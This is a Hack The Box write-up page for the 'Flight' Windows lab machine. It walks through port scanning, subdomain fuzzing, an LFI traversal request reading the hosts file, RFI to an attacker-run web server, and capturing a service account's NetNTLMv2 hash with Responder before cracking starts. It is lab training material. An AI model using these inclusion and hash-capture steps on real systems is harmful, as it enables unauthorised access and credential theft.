@@ -1,0 +1,605 @@
+<!DOCTYPE html>
+<html lang="en"><head><meta charset="UTF-8" /><meta name="viewport" content="width=device-width, initial-scale=1.0" /><title>Flight | Paracausal Telemetry</title><meta name="description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (80), LFI in school subdomain, RFI in school subdomain." /><meta name="robots" content="index,follow" /><meta name="theme-color" content="#0a0b0c" /><meta name="referrer" content="strict-origin-when-cross-origin" /><link rel="canonical" href="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-flight/" /><meta property="og:type" content="article" /><meta property="og:site_name" content="Paracausal Telemetry" /><meta property="og:title" content="Flight" /><meta property="og:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (80), LFI in school subdomain, RFI in school subdomain." /><meta property="og:url" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-flight/" /><meta property="og:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-flight/og.png?v=f4995b78" /><meta property="og:image:width" content="1200" /><meta property="og:image:height" content="630" /><meta name="twitter:card" content="summary_large_image" /><meta name="twitter:title" content="Flight" /><meta name="twitter:description" content="Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (80), LFI in school subdomain, RFI in school subdomain." /><meta name="twitter:image" content="https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-flight/og.png?v=f4995b78" /><link rel="icon" type="image/svg+xml" href="/src/favicon.svg?v=5" /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/geist-var.woff2" crossorigin /><link rel="preload" as="font" type="font/woff2" href="/src/fonts/space-grotesk-var.woff2" crossorigin /><link rel="stylesheet" href="/styles.css?v=276fa973-site9" /><style>.writeup-article{max-width:var(--container-narrow,52rem);margin:0 auto}.writeup-article-head{margin:0 0 2rem}.writeup-meta{display:flex;flex-wrap:wrap;gap:0.5rem;margin:1.2rem 0 0}.writeup-chip{border:1px solid var(--line-strong);color:var(--muted);font:600 0.72rem/1 var(--font-mono,ui-monospace,monospace);letter-spacing:0.06em;padding:0.35rem 0.55rem;text-transform:uppercase}.writeup-chip-tag{text-transform:none;letter-spacing:0}.writeup-sources{display:flex;flex-wrap:wrap;gap:1.2rem;margin:1rem 0 0;font-size:0.82rem}.writeup-sources a,.writeup-article-footer a{display:inline-flex;align-items:center;min-height:24px}.writeup-article-footer{border-top:1px solid var(--line);margin:2.5rem 0 0;padding:1.2rem 0 0}.writeup-page-pager{margin:0 0 1.2rem}</style><script type="application/ld+json">{"@context":"https://schema.org","@graph":[{"@type":"TechArticle","headline":"Flight","description":"Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (80), LFI in school subdomain, RFI in school subdomain.","url":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-flight/","datePublished":"2026-04-06","keywords":"Hack The Box, Active Directory, Windows","author":{"@type":"Organization","name":"Paracausal Telemetry","url":"https://paracausaltelemetry.com/"}},{"@type":"BreadcrumbList","itemListElement":[{"@type":"ListItem","position":1,"name":"Home","item":"https://paracausaltelemetry.com/"},{"@type":"ListItem","position":2,"name":"Writeups","item":"https://paracausaltelemetry.com/writeups/"},{"@type":"ListItem","position":3,"name":"Flight","item":"https://paracausaltelemetry.com/writeups/htb/ethan-bauer/htb-flight/"}]}]}</script></head><body><script>(function(){try{var m=document.cookie.match(/(?:^|;\s*)pt_theme=(light|dark)/);var t=m?m[1]:localStorage.getItem("theme");var d=window.matchMedia("(prefers-color-scheme: dark)").matches;if(t==="light"||(!t&&!d))document.body.classList.add("light-mode");}catch(e){}})();</script><a class="skip-to-content" href="#writeup">Skip to writeup</a><div class="page-shell"><header class="site-header" data-site-header><a class="brand" href="/" aria-label="Back to home"><span class="brand-mark" aria-hidden="true"><svg viewBox="0 0 48 48" focusable="false"><circle cx="24" cy="24" r="19" class="brand-radar-ring"></circle><circle cx="24" cy="24" r="11.5" class="brand-radar-ring brand-radar-ring-inner"></circle><path d="M24 5V43M5 24H43" class="brand-radar-grid"></path><g class="brand-radar-sweep"><rect class="brand-radar-trail" x="28" y="18.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="30.5" y="15.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="33" y="13.2" width="1.8" height="1.8" opacity="0.54"></rect><rect class="brand-radar-trail" x="35.5" y="10.7" width="1.8" height="1.8" opacity="0.68"></rect><rect class="brand-radar-trail" x="35.5" y="13.2" width="1.8" height="1.8" opacity="0.31"></rect><rect class="brand-radar-trail" x="33" y="15.7" width="1.8" height="1.8" opacity="0.21"></rect><rect class="brand-radar-trail" x="30.5" y="18.2" width="1.8" height="1.8" opacity="0.24"></rect><rect class="brand-radar-trail" x="38" y="13.2" width="1.8" height="1.8" opacity="0.33"></rect><rect class="brand-radar-trail" x="35.5" y="15.7" width="1.8" height="1.8" opacity="0.36"></rect><rect class="brand-radar-trail" x="33" y="18.2" width="1.8" height="1.8" opacity="0.22"></rect><rect class="brand-radar-trail" x="38" y="15.7" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="35.5" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><rect class="brand-radar-trail" x="30.5" y="20.7" width="1.8" height="1.8" opacity="0.14"></rect><rect class="brand-radar-trail" x="38" y="18.2" width="1.8" height="1.8" opacity="0.12"></rect><path class="brand-radar-beam" d="M24 24L36.2 9.4"></path></g><circle cx="24" cy="24" r="2.6" class="brand-radar-core"></circle><circle cx="39" cy="20.5" r="2.8" class="brand-radar-blip"></circle></svg></span><span class="brand-copy"><strong id="brand-name">Paracausal Telemetry</strong><small id="brand-role">Writeups</small></span></a><a class="site-menu-toggle" href="#site-menu"><span>Menu</span><svg viewBox="0 0 24 24" aria-hidden="true" focusable="false"><path d="M4 7h16M4 12h16M4 17h16" /></svg></a><div class="header-actions" id="site-menu" data-site-menu><nav class="site-nav" aria-label="Primary navigation"><a href="/">Home</a><a href="/writeups/" aria-current="page">Writeups</a><a href="/cpts/">CPTS</a><a href="/links/">Links</a><a href="/#talks">Talks</a><a href="https://alchemist.paracausaltelemetry.com/" aria-label="Alchemist (opens the separate Alchemist app)">Alchemist<svg class="nav-external" viewBox="0 0 12 12" aria-hidden="true" focusable="false"><path d="M4 2h6v6M10 2 3 9"/></svg></a></nav><button class="theme-toggle" id="theme-toggle" type="button" aria-label="Toggle light and dark mode"><svg class="theme-icon theme-icon-sun" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><circle cx="12" cy="12" r="4"/><path d="M12 2v2"/><path d="M12 20v2"/><path d="m4.93 4.93 1.41 1.41"/><path d="m17.66 17.66 1.41 1.41"/><path d="M2 12h2"/><path d="M20 12h2"/><path d="m6.34 17.66-1.41 1.41"/><path d="m19.07 4.93-1.41 1.41"/></svg><svg class="theme-icon theme-icon-moon" viewBox="0 0 24 24" fill="none" stroke="currentColor" stroke-width="2" stroke-linecap="round" stroke-linejoin="round" aria-hidden="true"><path d="M21 12.79A9 9 0 1 1 11.21 3 7 7 0 0 0 21 12.79z"/></svg></button></div></header><main id="writeup" class="learn-library-main"><nav class="learn-breadcrumbs" aria-label="Breadcrumb"><a href="/">Home</a><span>/</span><a href="/writeups/">Writeups</a><span>/</span><span aria-current="page">Flight</span></nav><article class="writeup-article"><header class="writeup-article-head"><p class="eyebrow">Hack The Box · 2026-04-06 · 23 min read</p><h1>Flight</h1><p>Hard Hack The Box Active Directory machine, written up by Ethan Bauer. Covers HTTP (80), LFI in school subdomain, RFI in school subdomain.</p><div class="writeup-meta"><span class="writeup-chip">Difficulty · hard</span><span class="writeup-chip writeup-chip-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg>OS · Windows</span><span class="writeup-chip writeup-chip-tag">Hack The Box</span><span class="writeup-chip writeup-chip-tag">Active Directory</span><span class="writeup-chip writeup-chip-tag">Windows</span></div><p class="writeup-sources"><a href="https://app.hackthebox.com/machines/Flight" rel="noreferrer" target="_blank">Original room</a><a href="https://github.com/paracausaltelemetry/CTF-Writeups/blob/main/HTB/ethan-bauer/htb-flight.md" rel="noreferrer" target="_blank">Source markdown</a></p></header><section class="room-card" aria-label="Hack The Box machine details"><div class="room-card-head room-card-has-icon"><img src="/writeups/meta/htb/machine-flight.webp" width="56" height="56" alt="" loading="lazy" decoding="async" /><div class="room-card-title"><p class="eyebrow">Hack The Box machine</p><h2>Flight</h2><p>Flight is a hard Windows machine that starts with a website with two different virtual hosts. One of them is vulnerable to LFI and allows an attacker to retrieve an NTLM hash. Once cracked, the obtained clear text password will be sprayed across a list of valid usernames to…</p></div><span class="room-badge room-badge-hard">Hard</span></div><dl class="room-facts"><div><dt>Released</dt><dd>5 Nov 2022</dd></div><div><dt>Retired</dt><dd>Yes</dd></div><div><dt>OS</dt><dd class="room-os"><svg class="os-icon os-icon-windows" viewBox="0 0 24 24" width="16" height="16" fill="currentColor" aria-hidden="true" focusable="false"><path d="M0 3.45 9.75 2.1v9.4H0zm10.95-1.5L24 0v11.4H10.95zM0 12.6h9.75V22L0 20.65zm10.95 0H24V24l-13.05-1.8z"/></svg><span>Windows</span></dd></div><div><dt>Creators</dt><dd>Geiseric, JDgodd</dd></div><div><dt>Rating</dt><dd>4.9 / 5</dd></div><div><dt>User owns</dt><dd>5,160</dd></div><div><dt>Root owns</dt><dd>4,223</dd></div><div><dt>User blood</dt><dd>jkr<small class="room-blood-time">0H 28M 57S</small></dd></div><div><dt>Root blood</dt><dd>xct<small class="room-blood-time">0H 51M 5S</small></dd></div></dl><div class="room-charts"><figure class="room-chart"><figcaption>Rated difficulty</figcaption><svg viewBox="0 0 254 64" role="img" aria-label="Player-rated difficulty, 4514 votes from easiest to hardest"><rect x="0" y="61" width="20" height="3" rx="2" fill="hsl(96 70% 55%)"><title>65 votes</title></rect><rect x="26" y="62" width="20" height="2" rx="2" fill="hsl(96 70% 55%)"><title>34 votes</title></rect><rect x="52" y="56" width="20" height="8" rx="2" fill="hsl(80 70% 55%)"><title>160 votes</title></rect><rect x="78" y="46" width="20" height="18" rx="2" fill="hsl(70 70% 55%)"><title>386 votes</title></rect><rect x="104" y="22" width="20" height="42" rx="2" fill="hsl(50 70% 55%)"><title>896 votes</title></rect><rect x="130" y="19" width="20" height="45" rx="2" fill="hsl(38 70% 55%)"><title>949 votes</title></rect><rect x="156" y="0" width="20" height="64" rx="2" fill="hsl(28 70% 55%)"><title>1357 votes</title></rect><rect x="182" y="44" width="20" height="20" rx="2" fill="hsl(16 70% 55%)"><title>426 votes</title></rect><rect x="208" y="59" width="20" height="5" rx="2" fill="hsl(8 70% 55%)"><title>114 votes</title></rect><rect x="234" y="58" width="20" height="6" rx="2" fill="hsl(0 70% 55%)"><title>127 votes</title></rect></svg></figure><figure class="room-chart room-radar"><figcaption>Player profile</figcaption><svg viewBox="-60 0 340 230" role="img" aria-label="Radar graph out of 10: Enumeration 7.5, Real-Life 7.3, CVE 6.4, Custom Exploitation 3.6, CTF-Like 2.7"><polygon points="110.0,92.5 126.6,104.6 120.3,124.2 99.7,124.2 93.4,104.6" class="radar-ring"/><polygon points="110.0,75.0 143.3,99.2 130.6,138.3 89.4,138.3 76.7,99.2" class="radar-ring"/><polygon points="110.0,57.5 159.9,93.8 140.9,152.5 79.1,152.5 60.1,93.8" class="radar-ring"/><polygon points="110.0,40.0 176.6,88.4 151.1,166.6 68.9,166.6 43.4,88.4" class="radar-ring"/><line x1="110" y1="110" x2="110.0" y2="40.0" class="radar-ring"/><line x1="110" y1="110" x2="176.6" y2="88.4" class="radar-ring"/><line x1="110" y1="110" x2="151.1" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="68.9" y2="166.6" class="radar-ring"/><line x1="110" y1="110" x2="43.4" y2="88.4" class="radar-ring"/><polygon points="110.0,57.5 158.6,94.2 136.3,146.2 95.2,130.4 92.0,104.2" class="radar-shape"/><text x="110.0" y="25.8" text-anchor="middle">Enumeration</text><text x="193.9" y="86.7" text-anchor="start">Real-Life</text><text x="161.8" y="185.4" text-anchor="start">CVE</text><text x="58.2" y="185.4" text-anchor="end">Custom Exploitation</text><text x="26.1" y="86.7" text-anchor="end">CTF-Like</text></svg></figure></div><p class="room-link"><a href="https://app.hackthebox.com/machines/Flight" rel="noreferrer" target="_blank">Open on Hack The Box<span class="visually-hidden"> (opens in a new tab)</span></a></p></section><div class="markdown-body"><h2>Host file setup</h2><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo nxc smb 10.129.228.120 --generate-hosts-file /etc/hosts
+[sudo] password for kali: 
+SMB         10.129.228.120  445    G0               [*] Windows 10 / Server 2019 Build 17763 x64 (name:G0) (domain:flight.htb) (signing:True) (SMBv1:None) (Null Auth:True)</code></pre><p>SMB signing enabled</p><p>Null auth enabled</p><h2>Enumeration</h2><h3>Open ports</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p- --min-rate=2000 -sT g0.flight.htb -Pn
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 15:59 +0100
+Nmap scan report for g0.flight.htb (10.129.228.120)
+Host is up (0.014s latency).
+rDNS record for 10.129.228.120: G0.flight.htb
+Not shown: 65518 filtered tcp ports (no-response)
+PORT      STATE SERVICE
+53/tcp    open  domain
+80/tcp    open  http
+88/tcp    open  kerberos-sec
+135/tcp   open  msrpc
+139/tcp   open  netbios-ssn
+389/tcp   open  ldap
+445/tcp   open  microsoft-ds
+464/tcp   open  kpasswd5
+593/tcp   open  http-rpc-epmap
+636/tcp   open  ldapssl
+3268/tcp  open  globalcatLDAP
+3269/tcp  open  globalcatLDAPssl
+9389/tcp  open  adws
+49667/tcp open  unknown
+49673/tcp open  unknown
+49674/tcp open  unknown
+49695/tcp open  unknown
+
+Nmap done: 1 IP address (1 host up) scanned in 66.70 seconds</code></pre><h3>Nmap</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nmap -p 53,80,88,135,139,389,445,464,593,636,3268,3269,9389 -A --min-rate=2000 -sT g0.flight.htb
+Starting Nmap 7.98 ( https://nmap.org ) at 2026-03-31 16:01 +0100
+Nmap scan report for g0.flight.htb (10.129.228.120)
+Host is up (0.014s latency).
+rDNS record for 10.129.228.120: G0.flight.htb
+
+PORT     STATE SERVICE       VERSION
+53/tcp   open  domain        Simple DNS Plus
+80/tcp   open  http          Apache httpd 2.4.52 ((Win64) OpenSSL/1.1.1m PHP/8.1.1)
+| http-methods: 
+|_  Potentially risky methods: TRACE
+|_http-server-header: Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1
+|_http-title: g0 Aviation
+88/tcp   open  kerberos-sec  Microsoft Windows Kerberos (server time: 2026-03-31 22:01:27Z)
+135/tcp  open  msrpc         Microsoft Windows RPC
+139/tcp  open  netbios-ssn   Microsoft Windows netbios-ssn
+389/tcp  open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
+445/tcp  open  microsoft-ds?
+464/tcp  open  kpasswd5?
+593/tcp  open  ncacn_http    Microsoft Windows RPC over HTTP 1.0
+636/tcp  open  tcpwrapped
+3268/tcp open  ldap          Microsoft Windows Active Directory LDAP (Domain: flight.htb, Site: Default-First-Site-Name)
+3269/tcp open  tcpwrapped
+9389/tcp open  mc-nmf        .NET Message Framing
+Warning: OSScan results may be unreliable because we could not find at least 1 open and 1 closed port
+Device type: general purpose
+Running (JUST GUESSING): Microsoft Windows 2019|10 (97%)
+OS CPE: cpe:/o:microsoft:windows_server_2019 cpe:/o:microsoft:windows_10
+Aggressive OS guesses: Windows Server 2019 (97%), Microsoft Windows 10 1903 - 21H1 (91%)
+No exact OS matches for host (test conditions non-ideal).
+Network Distance: 2 hops
+Service Info: Host: G0; OS: Windows; CPE: cpe:/o:microsoft:windows</code></pre><p>Web server is running apache</p><p>DC is running at +6h</p><h2>HTTP (80)</h2><h3>Nuclei </h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nuclei -u http://flight.htb/                                                                    
+
+[http-trace:trace-request] [http] [info] http://flight.htb/
+[http-trace:options-request] [http] [info] http://flight.htb/
+[waf-detect:apachegeneric] [http] [info] http://flight.htb/
+[ldap-metadata] [javascript] [info] flight.htb:389 [&quot;DomainControllerFunctionality: 7&quot;,&quot;BaseDN: dc=389&quot;,&quot;DnsHostName: g0.flight.htb&quot;,&quot;DefaultNamingContext: DC=flight,DC=htb&quot;,&quot;DomainFunctionality: 7&quot;,&quot;ForestFunctionality: 7&quot;]
+[smb2-capabilities] [javascript] [info] flight.htb:445 [&quot;[&quot;DFSSupport&quot;,&quot;LargeMTU&quot;,&quot;Leasing&quot;]&quot;]
+[smb-version-detect:smb-version] [javascript] [info] flight.htb:445 [&quot;SMB 2.1&quot;]
+[smb2-server-time] [javascript] [info] flight.htb:445 [&quot;SystemTime: 2026-03-31T22:06:08.000Z ServerStartTime: 2009-04-22T19:24:48.000Z&quot;]
+[smb-enum] [javascript] [info] flight.htb:445 [&quot;NetBIOSComputerName: G0&quot;,&quot;NetBIOSDomainName: flight&quot;,&quot;DNSComputerNamen: g0.flight.htb&quot;,&quot;DNSComputerName: g0.flight.htb&quot;,&quot;ForestName: flight.htb&quot;,&quot;OSVersion: 10.0.17763&quot;]
+[smb-enum-domains] [javascript] [info] flight.htb:445 [&quot;DomainName: flight.htb&quot;]
+[smb-os-detect] [javascript] [info] flight.htb:445 [&quot;Windows Server 2019, Version 1809&quot;]
+[ldap-anonymous-login-detect] [javascript] [medium] flight.htb:389
+[old-copyright] [http] [info] http://flight.htb/ [&quot;Copyright 2022&quot;]
+[http-missing-security-headers:clear-site-data] [http] [info] http://flight.htb/
+[http-missing-security-headers:strict-transport-security] [http] [info] http://flight.htb/
+[http-missing-security-headers:content-security-policy] [http] [info] http://flight.htb/
+[http-missing-security-headers:x-content-type-options] [http] [info] http://flight.htb/
+[http-missing-security-headers:referrer-policy] [http] [info] http://flight.htb/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://flight.htb/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://flight.htb/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://flight.htb/
+[http-missing-security-headers:missing-content-type] [http] [info] http://flight.htb/
+[http-missing-security-headers:permissions-policy] [http] [info] http://flight.htb/
+[http-missing-security-headers:x-frame-options] [http] [info] http://flight.htb/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://flight.htb/
+[cgi-printenv] [http] [medium] http://flight.htb/cgi-bin/printenv.pl
+[options-method] [http] [info] http://flight.htb/ [&quot;GET,POST,OPTIONS,HEAD,TRACE&quot;]
+[apache-detect] [http] [info] http://flight.htb/ [&quot;Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1&quot;]
+[openssl-detect] [http] [info] http://flight.htb/ [&quot;OpenSSL/1.1.1m&quot;]
+[php-detect] [http] [info] http://flight.htb/
+[caa-fingerprint] [dns] [info] flight.htb</code></pre><h3>Ffuf for subdomains</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">ffuf -u http://flight.htb/ -w /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt -H &#39;Host: FUZZ.flight.htb&#39; -t 50 -fs 7069
+
+        /&#39;___\  /&#39;___\           /&#39;___\       
+       /\ \__/ /\ \__/  __  __  /\ \__/       
+       \ \ ,__\\ \ ,__\/\ \/\ \ \ \ ,__\      
+        \ \ \_/ \ \ \_/\ \ \_\ \ \ \ \_/      
+         \ \_\   \ \_\  \ \____/  \ \_\       
+          \/_/    \/_/   \/___/    \/_/       
+
+       v2.1.0-dev
+________________________________________________
+
+ :: Method           : GET
+ :: URL              : http://flight.htb/
+ :: Wordlist         : FUZZ: /usr/share/seclists/Discovery/DNS/subdomains-top1million-110000.txt
+ :: Header           : Host: FUZZ.flight.htb
+ :: Follow redirects : false
+ :: Calibration      : false
+ :: Timeout          : 10
+ :: Threads          : 50
+ :: Matcher          : Response status: 200-299,301,302,307,401,403,405,500
+ :: Filter           : Response size: 7069
+________________________________________________
+
+school                  [Status: 200, Size: 3996, Words: 1045, Lines: 91, Duration: 15ms]
+Duration: [0:00:35:: P:: Progress: [114442/114442] :: Job [1/1] :: 285 req/sec :: Duration: [0:03:27] :: Errors: 0 ::</code></pre><p>Found a <code>school</code> subdomain</p><h3>Ferosbuster</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nothing interesting</code></pre><h3>Website functionality</h3><p><img src="images/flight/pasted-image-20260406003216.webp" alt="Screenshot" loading="lazy" /> The website appears to be a flight planner for an airline</p><p>This form on the landing page doesnt have any functionality</p><p>No other links on the page go anywhere</p><h3><code>school</code> subdomain</h3><h4>Feroxbuster</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nothing interesting</code></pre><p>There is a <code>phpmyadmin</code> install on here!</p><h4>Nuclei</h4><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">nuclei -u http://school.flight.htb/                  
+
+[http-trace:trace-request] [http] [info] http://school.flight.htb/
+[waf-detect:apachegeneric] [http] [info] http://school.flight.htb/
+[ldap-metadata] [javascript] [info] school.flight.htb:389 [&quot;DnsHostName: g0.flight.htb&quot;,&quot;DefaultNamingContext: DC=flight,DC=htb&quot;,&quot;DomainFunctionality: 7&quot;,&quot;ForestFunctionality: 7&quot;,&quot;DomainControllerFunctionality: 7&quot;,&quot;BaseDN: dc=389&quot;]
+[smb-version-detect:smb-version] [javascript] [info] school.flight.htb:445 [&quot;SMB 2.1&quot;]
+[smb2-capabilities] [javascript] [info] school.flight.htb:445 [&quot;[&quot;DFSSupport&quot;,&quot;LargeMTU&quot;,&quot;Leasing&quot;]&quot;]
+[smb2-server-time] [javascript] [info] school.flight.htb:445 [&quot;SystemTime: 2026-03-31T22:20:20.000Z ServerStartTime: 2009-04-22T19:24:48.000Z&quot;]
+[smb-enum-domains] [javascript] [info] school.flight.htb:445 [&quot;DomainName: flight.htb&quot;]
+[smb-enum] [javascript] [info] school.flight.htb:445 [&quot;OSVersion: 10.0.17763&quot;,&quot;NetBIOSComputerName: G0&quot;,&quot;NetBIOSDomainName: flight&quot;,&quot;DNSComputerNamen: g0.flight.htb&quot;,&quot;DNSComputerName: g0.flight.htb&quot;,&quot;ForestName: flight.htb&quot;]
+[smb-os-detect] [javascript] [info] school.flight.htb:445 [&quot;Windows Server 2019, Version 1809&quot;]
+[ldap-anonymous-login-detect] [javascript] [medium] school.flight.htb:389
+[tech-detect:php] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:permissions-policy] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:x-frame-options] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:x-content-type-options] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:referrer-policy] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:cross-origin-embedder-policy] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:cross-origin-opener-policy] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:missing-content-type] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:strict-transport-security] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:content-security-policy] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:x-permitted-cross-domain-policies] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:clear-site-data] [http] [info] http://school.flight.htb/
+[http-missing-security-headers:cross-origin-resource-policy] [http] [info] http://school.flight.htb/
+[apache-detect] [http] [info] http://school.flight.htb/ [&quot;Apache/2.4.52 (Win64) OpenSSL/1.1.1m PHP/8.1.1&quot;]
+[openssl-detect] [http] [info] http://school.flight.htb/ [&quot;OpenSSL/1.1.1m&quot;]
+[php-detect] [http] [info] http://school.flight.htb/ [&quot;8.1.1&quot;]
+[cgi-printenv] [http] [medium] http://school.flight.htb/cgi-bin/printenv.pl
+[caa-fingerprint] [dns] [info] school.flight.htb</code></pre><h4>Website functionality</h4><p><img src="images/flight/pasted-image-20260406003232.webp" alt="Screenshot" loading="lazy" /> There is clearly some protection on this functionality when trying to get LFI</p><h2>LFI in <code>school</code> subdomain</h2><p>After seeing the protections on the URL parameter i investigated further</p><p>Ill use this wordlist here to fuzz the parameter:</p><p>/usr/share/seclists/Fuzzing/LFI/LFI-Windows-adeadfed.txt</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">GET /index.php?view=%2F%2F.%2FC%3A%2FWindows%2Fsystem32%2Fdrivers%2Fetc%2Fhosts HTTP/1.1
+Host: school.flight.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://school.flight.htb/index.php?view=home.html
+Connection: close
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i</code></pre><p>After filtering the response length i found a file read vulnerability in the URL parameter bypassing any protections that are there</p><p>URL decoding the payload used i get this:</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">//./C:/Windows/system32/drivers/etc/hosts</code></pre><h2>RFI in <code>school</code> subdomain</h2><p>So to test this ill setup a python webserver on my machine</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...</code></pre><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">GET /index.php?view=http://10.10.14.90:8000/test.txt HTTP/1.1
+Host: school.flight.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://school.flight.htb/index.php?view=home.html
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i</code></pre><p>Ill send this request and wait for a response on my server</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">python3 -m http.server 8000
+Serving HTTP on 0.0.0.0 port 8000 (http://0.0.0.0:8000/) ...
+10.129.228.120 - - [31/Mar/2026 16:44:56] code 404, message File not found
+10.129.228.120 - - [31/Mar/2026 16:44:56] &quot;GET /test.txt HTTP/1.1&quot; 404 -</code></pre><p>Confirmed RFI</p><p>To exploit this i can use responder to try and capture a hash</p><p><a href="https://wise-forensics.com/2025/01/28/local-file-inclusion-lfi-remote-file-inclusion-rfi/" target="_blank" rel="noreferrer">https://wise-forensics.com/2025/01/28/local-file-inclusion-lfi-remote-file-inclusion-rfi/</a></p><h3>Capturing NTLM hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">sudo responder -I tun0</code></pre><p>Ill start up responder</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">GET /index.php?view=//10.10.14.90/share/test.txt HTTP/1.1
+Host: school.flight.htb
+User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:140.0) Gecko/20100101 Firefox/140.0
+Accept: text/html,application/xhtml+xml,application/xml;q=0.9,*/*;q=0.8
+Accept-Language: en-US,en;q=0.5
+Accept-Encoding: gzip, deflate
+Referer: http://school.flight.htb/index.php?view=home.html
+Connection: keep-alive
+Upgrade-Insecure-Requests: 1
+Priority: u=0, i</code></pre><p>Ill send this request to point to my share</p><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">[SMB] NTLMv2-SSP Client   : 10.129.228.120
+[SMB] NTLMv2-SSP Username : flight\svc_apache
+[SMB] NTLMv2-SSP Hash     : svc_apache::flight:8a3c1b3635d676a8:25ED2E661A0BCDB469DEE5868B951DAF:0101000000000000003DDDA82EC1DC01C7B08DBE2B3FDECC0000000002000800360045004300320001001E00570049004E002D0034004E005000380034004B004A00390035005400550004003400570049004E002D0034004E005000380034004B004A0039003500540055002E0036004500430032002E004C004F00430041004C000300140036004500430032002E004C004F00430041004C000500140036004500430032002E004C004F00430041004C0007000800003DDDA82EC1DC0106000400020000000800300030000000000000000000000000300000FB840A9349D10ED9F2C6048A7D2E4AF1AFB055F5E509F4FF113D3D01B3D9EC580A001000000000000000000000000000000000000900200063006900660073002F00310030002E00310030002E00310034002E00390030000000000000000000</code></pre><p>Ive captured an NetNTLMv2 hash</p><h3>Cracking hash</h3><pre><span class="bt-code-lang" aria-hidden="true">python</span><code class="language-python">hashcat svc_apache.hash /usr/share/wordlists/rockyou.txt
+
+
